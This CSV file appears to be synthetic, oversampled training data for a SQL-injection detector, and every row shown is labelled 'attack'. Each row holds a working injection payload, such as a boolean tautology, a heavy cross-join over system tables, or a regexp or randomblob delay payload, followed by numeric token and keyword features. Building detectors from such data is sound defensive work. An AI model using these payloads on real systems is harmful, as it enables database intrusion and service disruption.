id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000219,attack,boolean,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000161,0.1451432181625863,225.1789880809306,36.961968126421596,3.887252199032324,68.53244623009769,34.77180875852956,87.49441435651929,34.380318735784066,0.3042558957639811,0.15463271321915353,0.38853600932807,0.15257538168879534,2.076063747156813,0.0,0.0,0.0,0.0,2.0,0.0,18.152127494313625,0.0,1.0380318735784064,3.0380318735784066,10.076063747156812,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.9619681264215936,0.0,0.9619681264215936,0.0,1.0,0.038031873578406594,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.076063747156812,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.038031873578406
SMOTE_000220,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000043,0.9895182992110504,120.74238139678558,31.0,3.8108099330311678,51.76580126980507,10.529274841274367,41.96487019047076,16.48243509523538,0.41230897231147584,0.09406987717227873,0.35477638443045617,0.1388447660857893,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.0,1.0,0.5058549682548733,1.4941450317451268,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000221,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000271,1.0576221788809819,131.51979347001893,29.45544389742302,3.905486895283709,55.42573982903836,13.029704068384653,44.88118372646138,18.18316584613453,0.4223331261649196,0.10116577502078211,0.33964387355933584,0.13685722525496247,3.0,0.0,0.0,0.0,0.0,0.0,0.0,9.72772194871151,0.0,1.2425739829038365,2.514852034192327,1.4554438974230188,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.24257398290383647,0.24257398290383653,0.0,0.0,0.2425739829038365,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7574260170961635,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2425739829038367
SMOTE_000222,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000130,0.2499898381474067,85.92480213241016,18.811722579535314,2.7961745390982773,4.811722579535321,23.24689031814126,46.24274407566295,11.62344515907063,0.0557919378979192,0.2715668503193058,0.5368577866231221,0.1357834251596529,0.06275914015489481,0.0,1.0,0.0,0.9372408598451052,1.9372408598451054,0.0,7.686204299225526,0.0,-1.1102230246251565e-16,0.0,3.874481719690211,0.06275914015489464,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.9372408598451053,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9372408598451054
SMOTE_000223,attack,boolean,"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000139,1.1035161318392308,167.17797865654168,28.548014228972207,3.675931357571809,66.5480142289722,9.451985771027795,64.2740071144861,26.903971542055586,0.3981356348894509,0.0564990556625993,0.3845109149067459,0.16085439454120387,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,3.629964427569485,3.451985771027794,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000224,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'jxqf' like 'jxqf",nearest_attack_euclidean,R000275,0.16859460349936373,192.30957829302338,33.95938695841314,3.8696655453013262,72.0,16.0,74.43141741778398,29.878160875239423,0.3745204416775293,0.08322676481722874,0.3868948772272595,0.1553579162779824,2.8781608752394225,0.12183912476057757,0.0,0.0,0.0,0.0,0.0,16.878160875239423,0.0,2.0,4.0,4.0,0.9593869584131408,0.04061304158685919,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000225,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000154,0.20769591248498145,212.6838995089866,33.84194975449331,3.762082223805811,63.0,33.73707536826004,84.52584926347993,31.420974877246657,0.29623970750432804,0.15870354722557778,0.39732997762277883,0.1477267676473153,0.0,0.0,2.0,0.0,0.0,2.0,0.0,17.420974877246657,0.0,1.0,3.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000226,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000261,0.37184898075159256,146.1049959565464,33.45107056211708,4.165042477345726,77.0524979782732,16.0,37.90214112423416,15.150356854039028,0.5274077011328153,0.10963080453126132,0.25923098942939093,0.10373050490653236,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.150356854039027,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.15035685403902754,0.8496431459609726,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000227,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000218,0.19523824901791895,154.3630163629929,33.67037704537412,4.147391182334107,75.32962295462588,16.0,46.36301636299292,16.670377045374114,0.48837364068959926,0.10371443330022286,0.2999275752234957,0.1079843507866822,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.670377045374115,0.0,-1.1102230246251565e-16,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000228,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,0.447516699053504,96.05666783872412,29.0,3.8055538775456075,37.35480154711583,12.188666432255177,34.35093314580414,12.162266713548965,0.3815336651333598,0.12947051559495196,0.3616966253306055,0.1272991939410828,0.0,0.0,2.0,0.0,1.0,1.0,0.0,5.675466572902071,0.0,0.8377332864510353,1.1622667135489646,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000229,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000233,1.876995010869374,122.0882626594255,32.363967167571815,3.572769880048583,36.54413132971275,11.819835837859067,53.72429549185368,20.0,0.2991222177884393,0.09754508397525664,0.43935083520645857,0.1639818630298455,3.4558686702872534,1.9080984972845598,0.0,1.0,0.0,1.3639671675718135,0.0,9.90809849728456,1.3639671675718135,-1.1102230246251565e-16,1.0,2.3639671675718135,1.0,0.6360328324281866,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.6360328324281866,0.0,0.0,0.0,1.0,0.36396716757181335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000230,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000181,0.1466415085450977,110.15665976909561,29.044386327942338,3.8460111361284337,40.24543242498029,14.088772655884672,38.955613672057666,16.86684101617299,0.3645534614806004,0.12824721191107127,0.3540896383278175,0.15310968828051083,0.0,3.044386327942336,0.04438632794233621,0.0,0.0,1.0,0.0,7.911227344115328,0.9556136720576638,1.0,2.9112273441153276,1.0443863279423367,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.04438632794233616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9556136720576638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000231,attack,boolean,"1""  )   as qmtx where 5280  =  5280 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000260,0.2381486463679461,207.77651500721703,33.80587124819575,3.739458937816246,119.09706437590214,20.0,51.58238625541276,17.097064375902125,0.5732543992799217,0.0962694011876342,0.2481957463094568,0.08228045322298733,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.097064375902126,0.0,-1.1102230246251565e-16,6.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.09706437590212635,0.9029356240978735,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000232,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000184,0.5733224046487337,176.35825183476695,32.72966585121469,4.139054163382887,83.72308476037429,18.0,48.635167074392655,26.0,0.47461131844263793,0.10210595927711572,0.2757963366577459,0.14748638562250047,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,2.0,0.0,1.0,1.8175835371963278,0.1824164628036724,0.8175835371963276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.817583537196327
SMOTE_000233,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000199,0.5171830275438972,24.327264604682455,14.327264604682453,3.458171800515002,3.061811683745958,12.0,6.265452920936482,3.0,0.12075642782110593,0.4970074918382152,0.2579842073811251,0.12425187295955378,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000234,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000045,0.9673130206450627,132.77487574544676,35.76963398181763,3.740717250690652,39.46597379999389,21.15707185454101,54.460732036364746,17.691098054547123,0.2962167101910803,0.15848237886163824,0.41133174220657426,0.13396916874070716,2.0,0.23036601818237368,2.0,1.0,0.0,1.7696339818176263,0.0,9.460732036364748,0.23036601818237373,-1.1102230246251565e-16,1.0,4.769633981817626,1.0,0.23036601818237373,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.7696339818176264,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7696339818176265
SMOTE_000235,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000150,1.597719821843592,41.01424003253504,13.971519934929924,2.7991953119839668,2.0,12.0,20.0,7.014240032535037,0.04879257138983928,0.29275542833903545,0.4879257138983924,0.1705262863727329,1.0,0.0,2.0142400325350374,0.0,0.0,1.0,0.0,3.0,0.0,-1.1102230246251565e-16,0.0,3.014240032535037,1.0,0.0,0.5071200162675186,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000236,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000128,0.4466686456649673,36.07821243304281,14.168715026782879,2.832487735277902,3.0,9.0,17.662569946434246,6.41564248660856,0.08353345603383983,0.2506003681015194,0.48814176414033134,0.1777244117243094,1.0,0.0,2.0,0.0,0.0,1.0,0.0,2.4156424866085597,0.0,-1.1102230246251565e-16,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000237,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000128,1.625238309399024,38.601391353777245,17.30069567688863,3.2487759212654677,6.220973947644076,10.840556541510903,15.539860864622277,6.0,0.15221185839476403,0.27885454560653433,0.4109177859202682,0.15801581007843346,0.5398608646222742,0.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,-1.1102230246251565e-16,0.460139135377726,3.0,0.5398608646222741,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000238,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000193,0.9781345592712961,38.92221692541327,15.730554231353311,2.9257143364621467,2.0,12.0,18.922216925413252,6.0,0.05149692093692604,0.30898152562155623,0.4850307906307396,0.15449076281077812,0.7305542313533129,0.2694457686466871,1.0,0.0,0.0,1.0,0.0,2.730554231353313,0.2694457686466871,-1.1102230246251565e-16,0.0,2.0,0.7305542313533129,0.2694457686466872,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000239,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000256,0.7985113436752668,385.8025450596156,31.419745494038438,3.3333378712782116,95.67898197615375,56.32101802384625,180.80254505961565,53.0,0.2482977389819549,0.1458672863190737,0.468395854034797,0.13743912066417444,0.0,0.8394909880768723,1.0,0.0,0.0,3.0,0.0,37.160509011923125,0.0,-1.1102230246251565e-16,1.0,14.0,0.0,0.20987274701921813,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000240,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000201,1.9109002101551777,115.9454737627683,33.486368440692075,3.614839240802828,31.504543853102643,15.0,50.954561468973594,18.48636844069208,0.27267098833328646,0.1297181738866226,0.43841355950072675,0.15919727827936417,2.504543853102641,0.4954561468973593,2.0,1.0,0.0,1.0,0.0,9.990912293794718,0.4954561468973593,-1.1102230246251565e-16,1.0,4.0,1.0,0.4954561468973593,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.5045438531026407,0.4954561468973593,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000241,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000094,1.204973717161652,30.27926688500652,13.11142460736979,3.38534403525175,3.389280759212241,14.222849214739583,7.667136911054683,4.999999999999998,0.1019758956457209,0.47292729795310134,0.24909347406029828,0.1760033323408795,0.7221438481575521,0.0,3.0,0.0,0.0,1.2778561518424478,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,4.277856151842448,0.7221438481575521,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.27785615184244794,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2778561518424483
SMOTE_000242,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000284,0.22341873537484389,62.00146155925813,22.733723082468835,3.601208088719384,12.600584623703263,20.0,23.467446164937673,5.933430770617209,0.20232071131711282,0.3240644076768642,0.3777824176484385,0.09583246335758444,0.9334307706172091,0.06656922938279097,1.0,0.0,0.0,2.0,0.0,1.9334307706172087,0.0,-1.1102230246251565e-16,0.0,3.0,0.9334307706172091,0.06656922938279103,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000243,attack,boolean,"-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000258,0.10905726861579541,370.94782617051396,31.947826170514027,3.4357588156916288,96.0,58.0,165.0,51.94782617051402,0.2587965956700711,0.15635627655066794,0.44480664880793463,0.1400404789713264,0.9478261705140246,0.0,3.0,0.0,0.0,3.0,0.0,34.0,0.0,-1.1102230246251565e-16,1.0,16.0,0.9478261705140246,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000244,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000307,0.0013300845568347363,55.99083956107815,22.995419780539073,3.761270047409993,12.993129670808614,20.0,17.997709890269533,4.999999999999998,0.2320440280027033,0.3572110151705495,0.3214422030341099,0.08930275379263737,0.0,1.0,1.0,0.0,0.0,2.0,0.0,1.0,0.0,-1.1102230246251565e-16,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000245,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000306,0.05935248597460877,127.6218371187454,28.04145580791636,3.8944281456208705,71.91708838416727,8.165823231665438,35.45601388707996,12.082911615832721,0.5641555721069048,0.06379882910233953,0.27740355406505174,0.09464204472570392,0.0,0.0,0.0,0.0,1.0,1.0207279039581802,0.0,5.06218371187454,0.0,-1.1102230246251565e-16,2.0,2.0207279039581802,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0207279039581802,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0207279039581802
SMOTE_000246,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000151,0.06211454462782592,70.75950305860468,26.80760244688374,3.700653110935979,11.807602446883742,16.0,28.0,14.951900611720935,0.1667148393140183,0.2261732716735649,0.3958032254287386,0.21130866358367822,4.0,0.0,1.0,0.0,0.0,2.0,0.0,4.0,2.0,0.9519006117209358,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
